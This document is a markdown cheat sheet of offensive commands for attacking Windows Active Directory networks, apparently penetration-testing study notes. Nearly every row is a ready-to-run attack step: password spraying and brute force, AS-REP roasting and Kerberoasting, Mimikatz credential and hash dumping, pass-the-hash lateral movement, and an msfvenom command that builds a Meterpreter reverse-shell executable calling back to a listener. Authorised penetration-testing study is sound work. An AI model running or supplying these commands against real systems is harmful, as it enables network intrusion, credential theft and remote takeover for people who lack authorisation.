## Table of useful command

| Tool            | Description / Principal Use                                                | Cmd |
|-----------------|------------------------------------------------------------------------------|-----------------|
| `kerbrute` | Enumerate<br>brute force/password spray | **Enumeration**: `kerbrute userenum -d example.local --dc 192.168.1.10 users.txt`<br><br>**BruteForce**: `kerbrute bruteuser -d example.local --dc 192.168.1.10 administrator passwords.txt`<br><br>`users.txt` file with user list |
| `crackmapexec`<br>| Enum hosts<br>Enum null sess Enum anony access | **Get password Policy**: `cme <IP> -u ‘user’ -p ‘password’ --pass-pol`<br>**DO IT BEFORE… THEN TUNE THE Pwd SPRAY with policy obtained**<br><br>**Username but NO pwd**: `cme smb <dc_ip> -u user.txt -p password.txt --no-bruteforce`<br><br>**Valid Credential**:<br>Users: `cme smb <IP> -u <user> -p ‘<password_from_before>’ --users`<br>Account: `cme smb <IP> -u <user> -p ‘<password_from_before>’ --shares`<br><br>**Enumeration**: `crackmapexec smb <IP>`<br>`crackmapexec smb <IP> -u " p"`<br>`crackmapexec smb <IP> -u ‘a’ -p"`<br><br>**Lateral Movement**: `crackmapexec smb <IP> -u <user> -p <password> -d <domain>` |
| `evil-winrm` | Access to target machine | **Lateral Movement**: `evil-winrm -i 192.168.1.100 -u Administrator -p 'Password123'` |
| `xfreerdp` | Access to target machine | **Lateral Movement**: `xfreerdp /v:192.168.1.100 /u:Administrator /p:'Password123'` |
| `smbclient` | Access resource like SMB/CIFS | **Lateral Movement**: `smbclient.py <domain>/<user>:<Password123>@<IP>`<br><br>`smbclient -L //<dc_ip>/` |
| `Enter-PSSession` | Start interactive session | `Enter-PSSession <domain>`<br>`Enter-PSSession seclogs.resesarch.security.local` |
| `net` | Useful for policy settings | `net accounts`<br>`net user administrator` |
| `runas` | Access to victim | `runas.exe /user:administrator cmd` |
| `PowerView` | Enumeration AD - Powersploit suite | **AS-REP Roasting primary step**: `Get-DomainUser \| Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }`<br><br>**AD-Kerberoasting**: `Get-NetUser \| Where-Object {$_.servicePrincipalName} \| fl`<br>`setspn -T research -Q /` |
| `winpeas` | Identify misconfigurations, permissions, and vulnerabilities that could be exploited to gain elevated privileges | **Privilege escalation**: `winpeas.exe` |
| `msfvenom` | Used to generate a reverse_tcp payload | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe > rTCP.exe` |
| `msfconsole` | Metasploit module | `msfconsole -q`<br>Meterpreter session: `exploit/windows/misc/hta_server` |
| [Mimikatz](https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/) |  | **hashdump**: `hashdump` → Return NTLM Hash of the user<br>**creds_all**: `creds:all` → Extract all possible hashes or credentials from Security Packages<br>**lsa_dump_secrets**: `lsa_dump_secrets` → Extract credential stored into Local Security Authority<br>**lsa_dump_sam**: `lsa_dump_sam` → Extract Security Account Manager and dumps credentials for local accounts |
| `psexec` | Execute command on target machine | `psexec \\\\<target_ip> <cmd_command>`<br>OR use for PTH |
| `wmiexec` | Used to run command on target machine | `python wmiexec.py username:password@target_ip "whoami"` |
| `fping` | Ping ICMP machine to get alive | `fping -a -g 192.168.1.0/24` |
| `GetNPUsers` | Used to find hash | `python GetNPUsers.py <domain>/ -userfile username.txt -format hashcat -outputfile hash_out.txt`<br><br>`rebeus.exe asreproast /format:hashcat` |
| `hashcat` | Used to crack hash | `hashcat -m <algorithm> -a <type_of_attack> hash.txt` |
| `hydra` | Brute force | `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.0.89 smb2` |
| `wpscan` | Wordpress vuln | |
| `nmap` | port scanning | `nmap -sC -sV -Pn -p- -oA output.txt <IP_addr> -vv` |
